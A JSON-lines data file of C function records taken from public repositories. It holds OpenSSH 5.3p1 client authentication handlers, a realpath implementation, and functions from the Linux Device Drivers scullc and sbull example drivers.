{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_userauth_jpake_server_step1(int type, u_int32_t seq, void *ctxt)", "code": "{\n\tAuthctxt *authctxt = ctxt;\n\tstruct jpake_ctx *pctx = authctxt->methoddata;\n\tu_char *x3_proof, *x4_proof, *x2_s_proof;\n\tu_int x3_proof_len, x4_proof_len, x2_s_proof_len;\n\tchar *crypt_scheme, *salt;\n\n\t/* Disable this message */\n\tdispatch_set(SSH2_MSG_USERAUTH_JPAKE_SERVER_STEP1, NULL);\n\n\tif ((pctx->g_x3 = BN_new()) == NULL ||\n\t    (pctx->g_x4 = BN_new()) == NULL)\n\t\tfatal(\"%s: BN_new\", __func__);\n\n\t/* Fetch step 1 values */\n\tcrypt_scheme = packet_get_string(NULL);\n\tsalt = packet_get_string(NULL);\n\tpctx->server_id = packet_get_string(&pctx->server_id_len);\n\tpacket_get_bignum2(pctx->g_x3);\n\tpacket_get_bignum2(pctx->g_x4);\n\tx3_proof = packet_get_string(&x3_proof_len);\n\tx4_proof = packet_get_string(&x4_proof_len);\n\tpacket_check_eom();\n\n\tJPAKE_DEBUG_CTX((pctx, \"step 1 received in %s\", __func__));\n\n\t/* Obtain password and derive secret */\n\tpctx->s = jpake_password_to_secret(authctxt, crypt_scheme, salt);\n\tbzero(crypt_scheme, strlen(crypt_scheme));\n\tbzero(salt, strlen(salt));\n\txfree(crypt_scheme);\n\txfree(salt);\n\tJPAKE_DEBUG_BN((pctx->s, \"%s: s = \", __func__));\n\n\t/* Calculate step 2 values */\n\tjpake_step2(pctx->grp, pctx->s, pctx->g_x1,\n\t    pctx->g_x3, pctx->g_x4, pctx->x2,\n\t    pctx->server_id, pctx->server_id_len,\n\t    pctx->client_id, pctx->client_id_len,\n\t    x3_proof, x3_proof_len,\n\t    x4_proof, x4_proof_len,\n\t    &pctx->a,\n\t    &x2_s_proof, &x2_s_proof_len);\n\n\tbzero(x3_proof, x3_proof_len);\n\tbzero(x4_proof, x4_proof_len);\n\txfree(x3_proof);\n\txfree(x4_proof);\n\n\tJPAKE_DEBUG_CTX((pctx, \"step 2 sending in %s\", __func__));\n\n\t/* Send values for step 2 */\n\tpacket_start(SSH2_MSG_USERAUTH_JPAKE_CLIENT_STEP2);\n\tpacket_put_bignum2(pctx->a);\n\tpacket_put_string(x2_s_proof, x2_s_proof_len);\n\tpacket_send();\n\n\tbzero(x2_s_proof, x2_s_proof_len);\n\txfree(x2_s_proof);\n\n\t/* Expect step 2 packet from peer */\n\tdispatch_set(SSH2_MSG_USERAUTH_JPAKE_SERVER_STEP2,\n\t    input_userauth_jpake_server_step2);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_userauth_banner(int type, u_int32_t seq, void *ctxt)", "code": "{\n\tchar *msg, *raw, *lang;\n\tu_int len;\n\n\tdebug3(\"input_userauth_banner\");\n\traw = packet_get_string(&len);\n\tlang = packet_get_string(NULL);\n\tif (len > 0 && options.log_level >= SYSLOG_LEVEL_INFO) {\n\t\tif (len > 65536)\n\t\t\tlen = 65536;\n\t\tmsg = xmalloc(len * 4 + 1); /* max expansion from strnvis() */\n\t\tstrnvis(msg, raw, len * 4 + 1, VIS_SAFE|VIS_OCTAL);\n\t\tfprintf(stderr, \"%s\", msg);\n\t\txfree(msg);\n\t}\n\txfree(raw);\n\txfree(lang);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * parse PASSWD_CHANGEREQ, prompt user and send SSH2_MSG_USERAUTH_REQUEST\n */\n/* ARGSUSED */\n", "func_signal": "void\ninput_userauth_passwd_changereq(int type, u_int32_t seqnr, void *ctxt)", "code": "{\n\tAuthctxt *authctxt = ctxt;\n\tchar *info, *lang, *password = NULL, *retype = NULL;\n\tchar prompt[150];\n\n\tdebug2(\"input_userauth_passwd_changereq\");\n\n\tif (authctxt == NULL)\n\t\tfatal(\"input_userauth_passwd_changereq: \"\n\t\t    \"no authentication context\");\n\n\tinfo = packet_get_string(NULL);\n\tlang = packet_get_string(NULL);\n\tif (strlen(info) > 0)\n\t\tlogit(\"%s\", info);\n\txfree(info);\n\txfree(lang);\n\tpacket_start(SSH2_MSG_USERAUTH_REQUEST);\n\tpacket_put_cstring(authctxt->server_user);\n\tpacket_put_cstring(authctxt->service);\n\tpacket_put_cstring(authctxt->method->name);\n\tpacket_put_char(1);\t\t\t/* additional info */\n\tsnprintf(prompt, sizeof(prompt),\n\t    \"Enter %.30s@%.128s's old password: \",\n\t    authctxt->server_user, authctxt->host);\n\tpassword = read_passphrase(prompt, 0);\n\tpacket_put_cstring(password);\n\tmemset(password, 0, strlen(password));\n\txfree(password);\n\tpassword = NULL;\n\twhile (password == NULL) {\n\t\tsnprintf(prompt, sizeof(prompt),\n\t\t    \"Enter %.30s@%.128s's new password: \",\n\t\t    authctxt->server_user, authctxt->host);\n\t\tpassword = read_passphrase(prompt, RP_ALLOW_EOF);\n\t\tif (password == NULL) {\n\t\t\t/* bail out */\n\t\t\treturn;\n\t\t}\n\t\tsnprintf(prompt, sizeof(prompt),\n\t\t    \"Retype %.30s@%.128s's new password: \",\n\t\t    authctxt->server_user, authctxt->host);\n\t\tretype = read_passphrase(prompt, 0);\n\t\tif (strcmp(password, retype) != 0) {\n\t\t\tmemset(password, 0, strlen(password));\n\t\t\txfree(password);\n\t\t\tlogit(\"Mismatch; try again, EOF to quit.\");\n\t\t\tpassword = NULL;\n\t\t}\n\t\tmemset(retype, 0, strlen(retype));\n\t\txfree(retype);\n\t}\n\tpacket_put_cstring(password);\n\tmemset(password, 0, strlen(password));\n\txfree(password);\n\tpacket_add_padding(64);\n\tpacket_send();\n\n\tdispatch_set(SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ,\n\t    &input_userauth_passwd_changereq);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * char *realpath(const char *path, char resolved[PATH_MAX]);\n *\n * Find the real name of path, by removing all \".\", \"..\" and symlink\n * components.  Returns (resolved) on success, or (NULL) on failure,\n * in which case the path which caused trouble is left in (resolved).\n */\n", "func_signal": "char *\nrealpath(const char *path, char resolved[PATH_MAX])", "code": "{\n\tstruct stat sb;\n\tchar *p, *q, *s;\n\tsize_t left_len, resolved_len;\n\tunsigned symlinks;\n\tint serrno, slen;\n\tchar left[PATH_MAX], next_token[PATH_MAX], symlink[PATH_MAX];\n\n\tserrno = errno;\n\tsymlinks = 0;\n\tif (path[0] == '/') {\n\t\tresolved[0] = '/';\n\t\tresolved[1] = '\\0';\n\t\tif (path[1] == '\\0')\n\t\t\treturn (resolved);\n\t\tresolved_len = 1;\n\t\tleft_len = strlcpy(left, path + 1, sizeof(left));\n\t} else {\n\t\tif (getcwd(resolved, PATH_MAX) == NULL) {\n\t\t\tstrlcpy(resolved, \".\", PATH_MAX);\n\t\t\treturn (NULL);\n\t\t}\n\t\tresolved_len = strlen(resolved);\n\t\tleft_len = strlcpy(left, path, sizeof(left));\n\t}\n\tif (left_len >= sizeof(left) || resolved_len >= PATH_MAX) {\n\t\terrno = ENAMETOOLONG;\n\t\treturn (NULL);\n\t}\n\n\t/*\n\t * Iterate over path components in `left'.\n\t */\n\twhile (left_len != 0) {\n\t\t/*\n\t\t * Extract the next path component and adjust `left'\n\t\t * and its length.\n\t\t */\n\t\tp = strchr(left, '/');\n\t\ts = p ? p : left + left_len;\n\t\tif (s - left >= sizeof(next_token)) {\n\t\t\terrno = ENAMETOOLONG;\n\t\t\treturn (NULL);\n\t\t}\n\t\tmemcpy(next_token, left, s - left);\n\t\tnext_token[s - left] = '\\0';\n\t\tleft_len -= s - left;\n\t\tif (p != NULL)\n\t\t\tmemmove(left, s + 1, left_len + 1);\n\t\tif (resolved[resolved_len - 1] != '/') {\n\t\t\tif (resolved_len + 1 >= PATH_MAX) {\n\t\t\t\terrno = ENAMETOOLONG;\n\t\t\t\treturn (NULL);\n\t\t\t}\n\t\t\tresolved[resolved_len++] = '/';\n\t\t\tresolved[resolved_len] = '\\0';\n\t\t}\n\t\tif (next_token[0] == '\\0')\n\t\t\tcontinue;\n\t\telse if (strcmp(next_token, \".\") == 0)\n\t\t\tcontinue;\n\t\telse if (strcmp(next_token, \"..\") == 0) {\n\t\t\t/*\n\t\t\t * Strip the last path component except when we have\n\t\t\t * single \"/\"\n\t\t\t */\n\t\t\tif (resolved_len > 1) {\n\t\t\t\tresolved[resolved_len - 1] = '\\0';\n\t\t\t\tq = strrchr(resolved, '/') + 1;\n\t\t\t\t*q = '\\0';\n\t\t\t\tresolved_len = q - resolved;\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\n\t\t/*\n\t\t * Append the next path component and lstat() it. If\n\t\t * lstat() fails we still can return successfully if\n\t\t * there are no more path components left.\n\t\t */\n\t\tresolved_len = strlcat(resolved, next_token, PATH_MAX);\n\t\tif (resolved_len >= PATH_MAX) {\n\t\t\terrno = ENAMETOOLONG;\n\t\t\treturn (NULL);\n\t\t}\n\t\tif (lstat(resolved, &sb) != 0) {\n\t\t\tif (errno == ENOENT && p == NULL) {\n\t\t\t\terrno = serrno;\n\t\t\t\treturn (resolved);\n\t\t\t}\n\t\t\treturn (NULL);\n\t\t}\n\t\tif (S_ISLNK(sb.st_mode)) {\n\t\t\tif (symlinks++ > MAXSYMLINKS) {\n\t\t\t\terrno = ELOOP;\n\t\t\t\treturn (NULL);\n\t\t\t}\n\t\t\tslen = readlink(resolved, symlink, sizeof(symlink) - 1);\n\t\t\tif (slen < 0)\n\t\t\t\treturn (NULL);\n\t\t\tsymlink[slen] = '\\0';\n\t\t\tif (symlink[0] == '/') {\n\t\t\t\tresolved[1] = 0;\n\t\t\t\tresolved_len = 1;\n\t\t\t} else if (resolved_len > 1) {\n\t\t\t\t/* Strip the last path component. */\n\t\t\t\tresolved[resolved_len - 1] = '\\0';\n\t\t\t\tq = strrchr(resolved, '/') + 1;\n\t\t\t\t*q = '\\0';\n\t\t\t\tresolved_len = q - resolved;\n\t\t\t}\n\n\t\t\t/*\n\t\t\t * If there are any path components left, then\n\t\t\t * append them to symlink. The result is placed\n\t\t\t * in `left'.\n\t\t\t */\n\t\t\tif (p != NULL) {\n\t\t\t\tif (symlink[slen - 1] != '/') {\n\t\t\t\t\tif (slen + 1 >= sizeof(symlink)) {\n\t\t\t\t\t\terrno = ENAMETOOLONG;\n\t\t\t\t\t\treturn (NULL);\n\t\t\t\t\t}\n\t\t\t\t\tsymlink[slen] = '/';\n\t\t\t\t\tsymlink[slen + 1] = 0;\n\t\t\t\t}\n\t\t\t\tleft_len = strlcat(symlink, left, sizeof(left));\n\t\t\t\tif (left_len >= sizeof(left)) {\n\t\t\t\t\terrno = ENAMETOOLONG;\n\t\t\t\t\treturn (NULL);\n\t\t\t\t}\n\t\t\t}\n\t\t\tleft_len = strlcpy(left, symlink, sizeof(left));\n\t\t}\n\t}\n\n\t/*\n\t * Remove trailing slash except when the resolved pathname\n\t * is a single \"/\".\n\t */\n\tif (resolved_len > 1 && resolved[resolved_len - 1] == '/')\n\t\tresolved[resolved_len - 1] = '\\0';\n\treturn (resolved);\n}", "path": "src\\openssh\\openssh-5.3p1\\openbsd-compat\\realpath.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/* ARGSUSED */\n", "func_signal": "void\ninput_userauth_jpake_server_confirm(int type, u_int32_t seq, void *ctxt)", "code": "{\n\tAuthctxt *authctxt = ctxt;\n\tstruct jpake_ctx *pctx = authctxt->methoddata;\n\n\t/* Disable this message */\n\tdispatch_set(SSH2_MSG_USERAUTH_JPAKE_SERVER_CONFIRM, NULL);\n\n\tpctx->h_k_sid_sessid = packet_get_string(&pctx->h_k_sid_sessid_len);\n\tpacket_check_eom();\n\n\tJPAKE_DEBUG_CTX((pctx, \"confirm received in %s\", __func__));\n\n\t/* Verify expected confirmation hash */\n\tif (jpake_check_confirm(pctx->k,\n\t    pctx->server_id, pctx->server_id_len,\n\t    session_id2, session_id2_len,\n\t    pctx->h_k_sid_sessid, pctx->h_k_sid_sessid_len) == 1)\n\t\tdebug(\"%s: %s success\", __func__, authctxt->method->name);\n\telse {\n\t\tdebug(\"%s: confirmation mismatch\", __func__);\n\t\t/* XXX stash this so if auth succeeds then we can warn/kill */\n\t}\n\n\tuserauth_jpake_cleanup(authctxt);\n}", "path": "src\\openssh\\openssh-5.3p1\\.pc\\old-gssapi.patch\\sshconnect2.c", "repo_name": "eposts/Rich", "stars": 59, "license": "None", "language": "c", "size": 424575}
{"docstring": "/*\n * Finally, the module stuff\n */\n", "func_signal": "int scullc_init(void)", "code": "{\n\tint result, i;\n\tdev_t dev = MKDEV(scullc_major, 0);\n\t\n\t/*\n\t * Register your major, and accept a dynamic number.\n\t */\n\tif (scullc_major)\n\t\tresult = register_chrdev_region(dev, scullc_devs, \"scullc\");\n\telse {\n\t\tresult = alloc_chrdev_region(&dev, 0, scullc_devs, \"scullc\");\n\t\tscullc_major = MAJOR(dev);\n\t}\n\tif (result < 0)\n\t\treturn result;\n\n\t\n\t/* \n\t * allocate the devices -- we can't have them static, as the number\n\t * can be specified at load time\n\t */\n\tscullc_devices = kmalloc(scullc_devs*sizeof (struct scullc_dev), GFP_KERNEL);\n\tif (!scullc_devices) {\n\t\tresult = -ENOMEM;\n\t\tgoto fail_malloc;\n\t}\n\tmemset(scullc_devices, 0, scullc_devs*sizeof (struct scullc_dev));\n\tfor (i = 0; i < scullc_devs; i++) {\n\t\tscullc_devices[i].quantum = scullc_quantum;\n\t\tscullc_devices[i].qset = scullc_qset;\n\t\tsema_init (&scullc_devices[i].sem, 1);\n\t\tscullc_setup_cdev(scullc_devices + i, i);\n\t}\n\n\tscullc_cache = kmem_cache_create(\"scullc\", scullc_quantum,\n\t\t\t0, SLAB_HWCACHE_ALIGN, NULL); /* no ctor/dtor */\n\tif (!scullc_cache) {\n\t\tscullc_cleanup();\n\t\treturn -ENOMEM;\n\t}\n\n#ifdef SCULLC_USE_PROC /* only when available */\n\tcreate_proc_read_entry(\"scullcmem\", 0, NULL, scullc_read_procmem, NULL);\n#endif\n\treturn 0; /* succeed */\n\n  fail_malloc:\n\tunregister_chrdev_region(dev, scullc_devs);\n\treturn result;\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Follow the list \n */\n", "func_signal": "struct scullc_dev *scullc_follow(struct scullc_dev *dev, int n)", "code": "{\n\twhile (n--) {\n\t\tif (!dev->next) {\n\t\t\tdev->next = kmalloc(sizeof(struct scullc_dev), GFP_KERNEL);\n\t\t\tmemset(dev->next, 0, sizeof(struct scullc_dev));\n\t\t}\n\t\tdev = dev->next;\n\t\tcontinue;\n\t}\n\treturn dev;\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Set up our internal device.\n */\n", "func_signal": "static void setup_device(struct sbull_dev *dev, int which)", "code": "{\n\t/*\n\t * Get some memory.\n\t */\n\tmemset (dev, 0, sizeof (struct sbull_dev));\n\tdev->size = nsectors*hardsect_size;\n\tdev->data = vmalloc(dev->size);\n\tif (dev->data == NULL) {\n\t\tprintk (KERN_NOTICE \"vmalloc failure.\\n\");\n\t\treturn;\n\t}\n\tspin_lock_init(&dev->lock);\n\t\n\t/*\n\t * The timer which \"invalidates\" the device.\n\t */\n\tinit_timer(&dev->timer);\n\tdev->timer.data = (unsigned long) dev;\n\tdev->timer.function = sbull_invalidate;\n\t\n\t/*\n\t * The I/O queue, depending on whether we are using our own\n\t * make_request function or not.\n\t */\n\tswitch (request_mode) {\n\t    case RM_NOQUEUE:\n\t\tdev->queue = blk_alloc_queue(GFP_KERNEL);\n\t\tif (dev->queue == NULL)\n\t\t\tgoto out_vfree;\n\t\tblk_queue_make_request(dev->queue, sbull_make_request);\n\t\tbreak;\n\n\t    case RM_FULL:\n\t\tdev->queue = blk_init_queue(sbull_full_request, &dev->lock);\n\t\tif (dev->queue == NULL)\n\t\t\tgoto out_vfree;\n\t\tbreak;\n\n\t    default:\n\t\tprintk(KERN_NOTICE \"Bad request mode %d, using simple\\n\", request_mode);\n        \t/* fall into.. */\n\t\n\t    case RM_SIMPLE:\n\t\tdev->queue = blk_init_queue(sbull_request, &dev->lock);\n\t\tif (dev->queue == NULL)\n\t\t\tgoto out_vfree;\n\t\tbreak;\n\t}\n\tblk_queue_logical_block_size(dev->queue, hardsect_size);\n\tdev->queue->queuedata = dev;\n\t/*\n\t * And the gendisk structure.\n\t */\n\tdev->gd = alloc_disk(SBULL_MINORS);\n\tif (! dev->gd) {\n\t\tprintk (KERN_NOTICE \"alloc_disk failure\\n\");\n\t\tgoto out_vfree;\n\t}\n\tdev->gd->major = sbull_major;\n\tdev->gd->first_minor = which*SBULL_MINORS;\n\tdev->gd->fops = &sbull_ops;\n\tdev->gd->queue = dev->queue;\n\tdev->gd->private_data = dev;\n\tsnprintf (dev->gd->disk_name, 32, \"sbull%c\", which + 'a');\n\tset_capacity(dev->gd, nsectors*(hardsect_size/KERNEL_SECTOR_SIZE));\n\tadd_disk(dev->gd);\n\treturn;\n\n  out_vfree:\n\tif (dev->data)\n\t\tvfree(dev->data);\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * The ioctl() implementation\n */\n", "func_signal": "int sbull_ioctl (struct block_device *bdev, fmode_t mode,\n                 unsigned int cmd, unsigned long arg)", "code": "{\n\tlong size;\n\tstruct hd_geometry geo;\n\tstruct sbull_dev *dev = bdev->bd_disk->private_data;\n\n\tswitch(cmd) {\n\t    case HDIO_GETGEO:\n        \t/*\n\t\t * Get geometry: since we are a virtual device, we have to make\n\t\t * up something plausible.  So we claim 16 sectors, four heads,\n\t\t * and calculate the corresponding number of cylinders.  We set the\n\t\t * start of data at sector four.\n\t\t */\n\t\tsize = dev->size*(hardsect_size/KERNEL_SECTOR_SIZE);\n\t\tgeo.cylinders = (size & ~0x3f) >> 6;\n\t\tgeo.heads = 4;\n\t\tgeo.sectors = 16;\n\t\tgeo.start = 4;\n\t\tif (copy_to_user((void __user *) arg, &geo, sizeof(geo)))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\n\treturn -ENOTTY; /* unknown command */\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * The direct make request version.\n */\n", "func_signal": "static void sbull_make_request(struct request_queue *q, struct bio *bio)", "code": "{\n\tstruct sbull_dev *dev = q->queuedata;\n\tint status;\n\n\tstatus = sbull_xfer_bio(dev, bio);\n\tbio_endio(bio, status);\n\treturn 0;\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * The simple form of the request function.\n */\n", "func_signal": "static void sbull_request(struct request_queue *q)", "code": "{\n\tstruct request *req;\n\n\twhile ((req = blk_fetch_request(q)) != NULL) {\n\t\tstruct sbull_dev *dev = req->rq_disk->private_data;\n\t\tif (req->cmd_type != REQ_TYPE_FS) {\n\t\t\tprintk (KERN_NOTICE \"Skip non-fs request\\n\");\n\t\t\t__blk_end_request_cur(req, -EIO);\n\t\t\tcontinue;\n\t\t}\n    //    \tprintk (KERN_NOTICE \"Req dev %d dir %ld sec %ld, nr %d f %lx\\n\",\n    //    \t\t\tdev - Devices, rq_data_dir(req),\n    //    \t\t\treq->sector, req->current_nr_sectors,\n    //    \t\t\treq->flags);\n\t\tsbull_transfer(dev, blk_rq_pos(req), blk_rq_cur_sectors(req),\n\t\t\t\treq->buffer, rq_data_dir(req));\n\t\t__blk_end_request_cur(req, 0);\n\t}\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * \"Complete\" an asynchronous operation.\n */\n", "func_signal": "static void scullc_do_deferred_op(struct work_struct *work)", "code": "{\n\tstruct async_work *stuff = container_of(work, struct async_work, work.work);\n\taio_complete(stuff->iocb, stuff->result, 0);\n\tkfree(stuff);\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Look for a (simulated) media change.\n */\n", "func_signal": "int sbull_media_changed(struct gendisk *gd)", "code": "{\n\tstruct sbull_dev *dev = gd->private_data;\n\t\n\treturn dev->media_change;\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Transfer a full request.\n */\n", "func_signal": "static int sbull_xfer_request(struct sbull_dev *dev, struct request *req)", "code": "{\n\tstruct bio *bio;\n\tint nsect = 0;\n    \n\t__rq_for_each_bio(bio, req) {\n\t\tsbull_xfer_bio(dev, bio);\n\t\tnsect += bio->bi_size/KERNEL_SECTOR_SIZE;\n\t}\n\treturn nsect;\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * The ioctl() implementation\n */\n", "func_signal": "long scullc_ioctl (struct file *filp, unsigned int cmd, unsigned long arg)", "code": "{\n\n\tint err = 0, ret = 0, tmp;\n\n\t/* don't even decode wrong cmds: better returning  ENOTTY than EFAULT */\n\tif (_IOC_TYPE(cmd) != SCULLC_IOC_MAGIC) return -ENOTTY;\n\tif (_IOC_NR(cmd) > SCULLC_IOC_MAXNR) return -ENOTTY;\n\n\t/*\n\t * the type is a bitmask, and VERIFY_WRITE catches R/W\n\t * transfers. Note that the type is user-oriented, while\n\t * verify_area is kernel-oriented, so the concept of \"read\" and\n\t * \"write\" is reversed\n\t */\n\tif (_IOC_DIR(cmd) & _IOC_READ)\n\t\terr = !access_ok(VERIFY_WRITE, (void __user *)arg, _IOC_SIZE(cmd));\n\telse if (_IOC_DIR(cmd) & _IOC_WRITE)\n\t\terr =  !access_ok(VERIFY_READ, (void __user *)arg, _IOC_SIZE(cmd));\n\tif (err)\n\t\treturn -EFAULT;\n\n\tswitch(cmd) {\n\n\tcase SCULLC_IOCRESET:\n\t\tscullc_qset = SCULLC_QSET;\n\t\tscullc_quantum = SCULLC_QUANTUM;\n\t\tbreak;\n\n\tcase SCULLC_IOCSQUANTUM: /* Set: arg points to the value */\n\t\tret = __get_user(scullc_quantum, (int __user *) arg);\n\t\tbreak;\n\n\tcase SCULLC_IOCTQUANTUM: /* Tell: arg is the value */\n\t\tscullc_quantum = arg;\n\t\tbreak;\n\n\tcase SCULLC_IOCGQUANTUM: /* Get: arg is pointer to result */\n\t\tret = __put_user (scullc_quantum, (int __user *) arg);\n\t\tbreak;\n\n\tcase SCULLC_IOCQQUANTUM: /* Query: return it (it's positive) */\n\t\treturn scullc_quantum;\n\n\tcase SCULLC_IOCXQUANTUM: /* eXchange: use arg as pointer */\n\t\ttmp = scullc_quantum;\n\t\tret = __get_user(scullc_quantum, (int __user *) arg);\n\t\tif (ret == 0)\n\t\t\tret = __put_user(tmp, (int __user *) arg);\n\t\tbreak;\n\n\tcase SCULLC_IOCHQUANTUM: /* sHift: like Tell + Query */\n\t\ttmp = scullc_quantum;\n\t\tscullc_quantum = arg;\n\t\treturn tmp;\n\n\tcase SCULLC_IOCSQSET:\n\t\tret = __get_user(scullc_qset, (int __user *) arg);\n\t\tbreak;\n\n\tcase SCULLC_IOCTQSET:\n\t\tscullc_qset = arg;\n\t\tbreak;\n\n\tcase SCULLC_IOCGQSET:\n\t\tret = __put_user(scullc_qset, (int __user *)arg);\n\t\tbreak;\n\n\tcase SCULLC_IOCQQSET:\n\t\treturn scullc_qset;\n\n\tcase SCULLC_IOCXQSET:\n\t\ttmp = scullc_qset;\n\t\tret = __get_user(scullc_qset, (int __user *)arg);\n\t\tif (ret == 0)\n\t\t\tret = __put_user(tmp, (int __user *)arg);\n\t\tbreak;\n\n\tcase SCULLC_IOCHQSET:\n\t\ttmp = scullc_qset;\n\t\tscullc_qset = arg;\n\t\treturn tmp;\n\n\tdefault:  /* redundant, as cmd was checked against MAXNR */\n\t\treturn -ENOTTY;\n\t}\n\n\treturn ret;\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Open and close\n */\n", "func_signal": "int scullc_open (struct inode *inode, struct file *filp)", "code": "{\n\tstruct scullc_dev *dev; /* device information */\n\n\t/*  Find the device */\n\tdev = container_of(inode->i_cdev, struct scullc_dev, cdev);\n\n    \t/* now trim to 0 the length of the device if open was write-only */\n\tif ( (filp->f_flags & O_ACCMODE) == O_WRONLY) {\n\t\tif (down_interruptible (&dev->sem))\n\t\t\treturn -ERESTARTSYS;\n\t\tscullc_trim(dev); /* ignore errors */\n\t\tup (&dev->sem);\n\t}\n\n\t/* and use filp->private_data to point to the device data */\n\tfilp->private_data = dev;\n\n\treturn 0;          /* success */\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * The \"extended\" operations\n */\n", "func_signal": "loff_t scullc_llseek (struct file *filp, loff_t off, int whence)", "code": "{\n\tstruct scullc_dev *dev = filp->private_data;\n\tlong newpos;\n\n\tswitch(whence) {\n\tcase 0: /* SEEK_SET */\n\t\tnewpos = off;\n\t\tbreak;\n\n\tcase 1: /* SEEK_CUR */\n\t\tnewpos = filp->f_pos + off;\n\t\tbreak;\n\n\tcase 2: /* SEEK_END */\n\t\tnewpos = dev->size + off;\n\t\tbreak;\n\n\tdefault: /* can't happen */\n\t\treturn -EINVAL;\n\t}\n\tif (newpos<0) return -EINVAL;\n\tfilp->f_pos = newpos;\n\treturn newpos;\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/* FIXME: Do we need this here??  It be ugly  */\n", "func_signal": "int scullc_read_procmem(char *buf, char **start, off_t offset,\n                   int count, int *eof, void *data)", "code": "{\n\tint i, j, quantum, qset, len = 0;\n\tint limit = count - 80; /* Don't print more than this */\n\tstruct scullc_dev *d;\n\n\t*start = buf;\n\tfor(i = 0; i < scullc_devs; i++) {\n\t\td = &scullc_devices[i];\n\t\tif (down_interruptible (&d->sem))\n\t\t\treturn -ERESTARTSYS;\n\t\tqset = d->qset;  /* retrieve the features of each device */\n\t\tquantum=d->quantum;\n\t\tlen += sprintf(buf+len,\"\\nDevice %i: qset %i, quantum %i, sz %li\\n\",\n\t\t\t\ti, qset, quantum, (long)(d->size));\n\t\tfor (; d; d = d->next) { /* scan the list */\n\t\t\tlen += sprintf(buf+len,\"  item at %p, qset at %p\\n\",d,d->data);\n\t\t\tscullc_proc_offset (buf, start, &offset, &len);\n\t\t\tif (len > limit)\n\t\t\t\tgoto out;\n\t\t\tif (d->data && !d->next) /* dump only the last item - save space */\n\t\t\t\tfor (j = 0; j < qset; j++) {\n\t\t\t\t\tif (d->data[j])\n\t\t\t\t\t\tlen += sprintf(buf+len,\"    % 4i:%8p\\n\",j,d->data[j]);\n\t\t\t\t\tscullc_proc_offset (buf, start, &offset, &len);\n\t\t\t\t\tif (len > limit)\n\t\t\t\t\t\tgoto out;\n\t\t\t\t}\n\t\t}\n\t  out:\n\t\tup (&scullc_devices[i].sem);\n\t\tif (len > limit)\n\t\t\tbreak;\n\t}\n\t*eof = 1;\n\treturn len;\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Handle an I/O request.\n */\n", "func_signal": "static void sbull_transfer(struct sbull_dev *dev, unsigned long sector,\n\t\tunsigned long nsect, char *buffer, int write)", "code": "{\n\tunsigned long offset = sector*KERNEL_SECTOR_SIZE;\n\tunsigned long nbytes = nsect*KERNEL_SECTOR_SIZE;\n\n\tif ((offset + nbytes) > dev->size) {\n\t\tprintk (KERN_NOTICE \"Beyond-end write (%ld %ld)\\n\", offset, nbytes);\n\t\treturn;\n\t}\n\tif (write)\n\t\tmemcpy(dev->data + offset, buffer, nbytes);\n\telse\n\t\tmemcpy(buffer, dev->data + offset, nbytes);\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
